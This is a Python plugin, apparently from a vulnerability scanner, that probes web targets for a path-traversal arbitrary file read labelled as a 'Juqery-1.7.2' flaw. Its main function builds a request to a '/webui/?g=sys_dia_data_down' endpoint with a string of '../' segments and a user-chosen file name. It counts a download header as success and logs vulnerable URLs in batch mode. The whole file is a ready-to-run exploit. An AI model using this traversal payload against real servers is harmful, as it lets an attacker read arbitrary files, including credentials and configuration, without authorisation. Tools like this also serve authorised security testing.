#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()


class JqueryDirReadScan():
    def __init__(self):
        self.proexis = None
        self.headers = None

    def run(self,url):
        try:
            response = requests.post(url, headers=self.headers, verify=self.verify, proxies=self.proexis)
            contents = response.headers.get('Content-Disposition', '')
            if 'attachment' in contents.lower():
                OutPrintInfoSuc("JQuery", f"可能存在Juqery-1.7.2任意文件读取漏洞 {url}")
                if not self.batch:
                    OutPrintInfo("JQuery", f"需访问目录查看是否下载目标文件")
                else:   
                    with open("./result/jquery_dir_read.txt","a") as w:
                        w.write(f"{url}\n")

            else:
                if not self.batch:
                    OutPrintInfo("JQuery", f"目标不存在Juqery-1.7.2任意文件读取漏洞")
        except Exception as e:
            if not self.batch:
                OutPrintInfo("JQuery", f"目标请求出错")

    def main(self, results):
        self.batch = results["batch_work"]
        url = results["url"].strip('/ ')
        file = results["file"].lstrip(' /')
        head = results["header"]
        proxy = results["proxy"]
        self.verify = results["ssl"]
        self.headers, self.proxy = ReqSet(header=head, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("JQuery", "开始检测Juqery-1.7.2任意文件读取")
        new_url = url + f"/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../{file}"
        self.run(new_url)
        if not self.batch:
            OutPrintInfo("JQuery", "Jquery-1.7.2任意文件读取检测结束")
